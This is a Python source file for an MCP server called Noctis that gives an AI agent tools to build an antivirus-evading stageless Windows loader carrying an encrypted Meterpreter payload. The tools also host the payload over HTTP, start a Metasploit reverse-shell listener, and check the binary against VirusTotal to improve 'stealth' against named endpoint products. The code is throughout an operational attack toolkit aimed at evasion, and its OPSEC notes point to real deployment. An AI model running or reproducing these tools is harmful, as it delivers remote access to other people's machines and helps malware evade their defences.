#!/usr/bin/env python3
"""
Noctis MCP - Stageless Loader MCP Tools
Fully automated AV-bypassing stageless loaders
"""
import sys
import requests
from pathlib import Path

try:
    from fastmcp import FastMCP
except ImportError:
    print("[!] FastMCP not installed: pip install fastmcp")
    sys.exit(1)

mcp = FastMCP("Noctis-MCP")
SERVER_URL = "http://localhost:8888"


@mcp.tool()
def noctis_generate_stageless_loader(
    lhost: str,
    lport: int = 4444,
    http_port: int = 8080,
    auto_start_servers: bool = True
) -> str:
    """
    Generate complete stageless loader system and optionally start servers.

    This is the MAIN tool - does EVERYTHING automatically!
    User only needs to run the loader.exe on Windows.

    Args:
        lhost: Your Kali IP address (e.g., "10.10.10.100")
        lport: Meterpreter listener port (default: 4444)
        http_port: HTTP server port for payload delivery (default: 8080)
        auto_start_servers: Automatically start HTTP server and MSF listener (default: True)

    Returns:
        Complete status with all generated files and running services
    """
    try:
        # Step 1: Generate loader system
        response = requests.post(
            f"{SERVER_URL}/api/generate_stageless_loader",
            json={
                'lhost': lhost,
                'lport': lport,
                'http_port': http_port
            },
            timeout=120
        )

        if response.status_code != 200:
            data = response.json()
            return f"ERROR: Generation failed\n{data.get('error', response.text)}"

        data = response.json()
        if not data.get('success'):
            return f"ERROR: {data.get('error')}"

        output = []
        output.append("=" * 70)
        output.append("  [OK] STAGELESS LOADER GENERATED!")
        output.append("=" * 70)
        output.append("")
        output.append(f"LHOST: {data['lhost']}")
        output.append(f"LPORT: {data['lport']}")
        output.append(f"HTTP Port: {data['http_port']}")
        output.append(f"Output: {data['work_dir']}")
        output.append("")
        output.append("Generated files:")
        output.append(f"  stageless_loader.exe ({data['loader_size']:,} bytes) - CLEAN, NO MSFVenom!")
        output.append(f"  payload.enc ({data['payload_size']:,} bytes) - RC4 encrypted")
        output.append(f"  start_server.sh - HTTP server script")
        output.append(f"  start_listener.sh - Metasploit listener script")
        output.append("")

        # Step 2: Auto-start servers if requested
        if auto_start_servers:
            output.append("=" * 70)
            output.append("  [STARTING] STARTING SERVERS AUTOMATICALLY...")
            output.append("=" * 70)
            output.append("")

            # Start HTTP server
            http_response = requests.post(
                f"{SERVER_URL}/api/start_http_server",
                json={'port': http_port},
                timeout=30
            )

            if http_response.status_code == 200:
                http_data = http_response.json()
                if http_data.get('success'):
                    output.append(f"[OK] HTTP Server: RUNNING on port {http_data['port']}")
                    output.append(f"   Serving: {http_data['payload_url']}")
                    output.append(f"   PID: {http_data['pid']}")
                else:
                    output.append(f"[WARNING]  HTTP Server: {http_data.get('error')}")
            else:
                output.append(f"[WARNING]  HTTP Server: Failed to start")

            output.append("")

            # Start Metasploit listener
            msf_response = requests.post(
                f"{SERVER_URL}/api/start_msf_listener",
                json={'lhost': lhost, 'lport': lport},
                timeout=30
            )

            if msf_response.status_code == 200:
                msf_data = msf_response.json()
                if msf_data.get('success'):
                    output.append(f"[OK] Metasploit Listener: RUNNING")
                    output.append(f"   Listening: {msf_data['lhost']}:{msf_data['lport']}")
                    output.append(f"   Payload: {msf_data['payload']}")
                    output.append(f"   PID: {msf_data['pid']}")
                else:
                    output.append(f"[WARNING]  Metasploit Listener: {msf_data.get('error')}")
            else:
                output.append(f"[WARNING]  Metasploit Listener: Failed to start")

            output.append("")

        output.append("=" * 70)
        output.append("  [READY] READY TO TEST!")
        output.append("=" * 70)
        output.append("")
        output.append("Next steps:")
        output.append(f"  1. Copy {data['loader_path']} to Windows VM")
        output.append(f"  2. Run the loader on Windows")
        output.append(f"  3. Watch Metasploit for incoming session!")
        output.append("")
        output.append("To stop servers:")
        output.append("  - noctis_stop_servers()")
        output.append("")
        output.append("=" * 70)

        return "\n".join(output)

    except requests.exceptions.ConnectionError:
        return f"ERROR: Server not running. Start with:\n  python3 server/noctis_server.py"
    except Exception as e:
        return f"ERROR: {str(e)}"


@mcp.tool()
def noctis_check_status() -> str:
    """
    Check complete system status (files + running processes).

    Returns:
        Status of all files and running servers
    """
    try:
        # Check file status
        file_response = requests.post(
            f"{SERVER_URL}/api/check_status",
            json={},
            timeout=30
        )

        # Check process status
        process_response = requests.get(
            f"{SERVER_URL}/api/process_status",
            timeout=30
        )

        output = []
        output.append("=" * 70)
        output.append("  NOCTIS STAGELESS LOADER - SYSTEM STATUS")
        output.append("=" * 70)
        output.append("")

        # File status
        if file_response.status_code == 200:
            file_data = file_response.json()
            if file_data.get('success'):
                output.append(f"[FILES] Files: {file_data['work_dir']}")
                output.append("")

                for filename, info in file_data['files'].items():
                    if info['exists']:
                        size = info['size']
                        desc = info['description']
                        output.append(f"  [+] {filename:25s} {size:>10,} bytes - {desc}")
                    else:
                        desc = info['description']
                        output.append(f"  [-] {filename:25s} MISSING - {desc}")

                output.append("")
                if file_data['all_ready']:
                    output.append("[OK] All files present")
                else:
                    output.append("[FAILED] Missing files - run noctis_generate_stageless_loader()")

        output.append("")

        # Process status
        if process_response.status_code == 200:
            proc_data = process_response.json()
            if proc_data.get('success'):
                output.append("[SERVICES] Running Services:")
                output.append("")

                http_status = proc_data['processes']['http_server']
                if http_status['running']:
                    output.append(f"  [OK] HTTP Server: RUNNING (PID: {http_status['pid']})")
                else:
                    output.append(f"  [NOT RUNNING] HTTP Server: NOT RUNNING")

                msf_status = proc_data['processes']['msf_listener']
                if msf_status['running']:
                    output.append(f"  [OK] MSF Listener: RUNNING (PID: {msf_status['pid']})")
                else:
                    output.append(f"  [NOT RUNNING] MSF Listener: NOT RUNNING")

        output.append("")
        output.append("=" * 70)

        return "\n".join(output)

    except requests.exceptions.ConnectionError:
        return f"ERROR: Server not running. Start with:\n  python3 server/noctis_server.py"
    except Exception as e:
        return f"ERROR: {str(e)}"


@mcp.tool()
def noctis_start_servers(lhost: str, lport: int = 4444, http_port: int = 8080) -> str:
    """
    Start HTTP server and Metasploit listener.

    Args:
        lhost: Your Kali IP
        lport: Meterpreter listener port (default: 4444)
        http_port: HTTP server port (default: 8080)

    Returns:
        Status of started servers
    """
    try:
        output = []
        output.append("=" * 70)
        output.append("  [STARTING] STARTING SERVERS...")
        output.append("=" * 70)
        output.append("")

        # Start HTTP server
        http_response = requests.post(
            f"{SERVER_URL}/api/start_http_server",
            json={'port': http_port},
            timeout=30
        )

        if http_response.status_code == 200:
            http_data = http_response.json()
            if http_data.get('success'):
                output.append(f"[OK] HTTP Server: RUNNING")
                output.append(f"   Port: {http_data['port']}")
                output.append(f"   Payload URL: {http_data['payload_url']}")
                output.append(f"   PID: {http_data['pid']}")
            else:
                output.append(f"[FAILED] HTTP Server: {http_data.get('error')}")
        else:
            output.append(f"[FAILED] HTTP Server: Failed to start")

        output.append("")

        # Start Metasploit listener
        msf_response = requests.post(
            f"{SERVER_URL}/api/start_msf_listener",
            json={'lhost': lhost, 'lport': lport},
            timeout=30
        )

        if msf_response.status_code == 200:
            msf_data = msf_response.json()
            if msf_data.get('success'):
                output.append(f"[OK] Metasploit Listener: RUNNING")
                output.append(f"   Listening: {msf_data['lhost']}:{msf_data['lport']}")
                output.append(f"   Payload: {msf_data['payload']}")
                output.append(f"   PID: {msf_data['pid']}")
            else:
                output.append(f"[FAILED] Metasploit Listener: {msf_data.get('error')}")
        else:
            output.append(f"[FAILED] Metasploit Listener: Failed to start")

        output.append("")
        output.append("=" * 70)

        return "\n".join(output)

    except requests.exceptions.ConnectionError:
        return f"ERROR: Server not running. Start with:\n  python3 server/noctis_server.py"
    except Exception as e:
        return f"ERROR: {str(e)}"


@mcp.tool()
def noctis_stop_servers() -> str:
    """
    Stop all running servers (HTTP + Metasploit).

    Returns:
        Status of stopped servers
    """
    try:
        output = []
        output.append("=" * 70)
        output.append("  [STOPPING] STOPPING SERVERS...")
        output.append("=" * 70)
        output.append("")

        # Stop HTTP server
        http_response = requests.post(
            f"{SERVER_URL}/api/stop_http_server",
            json={},
            timeout=30
        )

        if http_response.status_code == 200:
            http_data = http_response.json()
            if http_data.get('success'):
                output.append(f"[OK] HTTP Server: STOPPED")
            else:
                output.append(f"[WARNING]  HTTP Server: {http_data.get('error')}")
        else:
            output.append(f"[FAILED] HTTP Server: Failed to stop")

        output.append("")

        # Stop Metasploit listener
        msf_response = requests.post(
            f"{SERVER_URL}/api/stop_msf_listener",
            json={},
            timeout=30
        )

        if msf_response.status_code == 200:
            msf_data = msf_response.json()
            if msf_data.get('success'):
                output.append(f"[OK] Metasploit Listener: STOPPED")
            else:
                output.append(f"[WARNING]  Metasploit Listener: {msf_data.get('error')}")
        else:
            output.append(f"[FAILED] Metasploit Listener: Failed to stop")

        output.append("")
        output.append("=" * 70)

        return "\n".join(output)

    except requests.exceptions.ConnectionError:
        return f"ERROR: Server not running. Start with:\n  python3 server/noctis_server.py"
    except Exception as e:
        return f"ERROR: {str(e)}"


@mcp.tool()
def noctis_test_binary(file_path: str) -> str:
    """
    Test a compiled binary against VirusTotal (70+ AV engines).

    WARNING: Only use during development when working on stealth improvements.
    VirusTotal shares samples with AV vendors - NEVER upload production binaries.

    Use case: When loader is getting detected and you need to identify which
    engines are flagging it to improve evasion techniques.

    Args:
        file_path: Absolute path to the binary to test (e.g., stageless_loader.exe)

    Returns:
        Detection results from 70+ AV engines including CrowdStrike, Defender,
        SentinelOne, Sophos, and more.
    """
    try:
        response = requests.post(
            f"{SERVER_URL}/api/test_binary",
            json={'file_path': file_path},
            timeout=300  # VT scans can take a while
        )

        if response.status_code != 200:
            data = response.json()
            return f"ERROR: VT testing failed\n{data.get('error', response.text)}"

        data = response.json()
        if not data.get('success'):
            return f"ERROR: {data.get('error')}"

        output = []
        output.append("=" * 70)
        output.append("  VIRUSTOTAL SCAN RESULTS")
        output.append("=" * 70)
        output.append("")
        output.append(f"File: {data['filename']}")
        output.append(f"SHA256: {data['sha256']}")
        output.append(f"File Size: {data['size']:,} bytes")
        output.append("")
        output.append(f"Detection Rate: {data['positives']}/{data['total']} engines")
        output.append(f"Scan Date: {data['scan_date']}")
        output.append(f"Permalink: {data['permalink']}")
        output.append("")

        if data['positives'] == 0:
            output.append("[OK] CLEAN - No detections! Perfect stealth!")
        elif data['positives'] <= 5:
            output.append("[WARNING] LOW detection - Good stealth, minor flags")
        elif data['positives'] <= 15:
            output.append("[WARNING] MODERATE detection - Needs improvement")
        else:
            output.append("[FAILED] HIGH detection - Requires major stealth work")

        output.append("")
        output.append("=" * 70)
        output.append("  DETECTION BREAKDOWN BY ENGINE")
        output.append("=" * 70)
        output.append("")

        # Group by detected/clean
        detected = []
        clean = []

        for engine, result in data['scans'].items():
            if result['detected']:
                detected.append(f"  [DETECTED] {engine:25s} -> {result['result']}")
            else:
                clean.append(f"  [CLEAN]    {engine:25s}")

        if detected:
            output.append(f"Engines that DETECTED ({len(detected)}):")
            output.extend(detected[:20])  # Show first 20
            if len(detected) > 20:
                output.append(f"  ... and {len(detected) - 20} more")

        output.append("")
        output.append(f"Engines that passed ({len(clean)}):")
        output.extend(clean[:10])  # Show first 10
        if len(clean) > 10:
            output.append(f"  ... and {len(clean) - 10} more")

        output.append("")
        output.append("=" * 70)
        output.append("  OPSEC WARNING")
        output.append("=" * 70)
        output.append("")
        output.append("This binary is now in VirusTotal's database and shared")
        output.append("with AV vendors. Do NOT reuse this exact binary.")
        output.append("Recompile with new polymorphic keys before deployment.")
        output.append("")
        output.append("=" * 70)

        return "\n".join(output)

    except requests.exceptions.ConnectionError:
        return f"ERROR: Server not running. Start with:\n  python3 server/noctis_server.py"
    except Exception as e:
        return f"ERROR: {str(e)}"


if __name__ == "__main__":
    print("[*] Noctis MCP Starting...")
    print("[*] Server URL:", SERVER_URL)
    print("[*] Tools: Fully Automated Stageless Loader + VT Testing")
    mcp.run(transport='stdio')
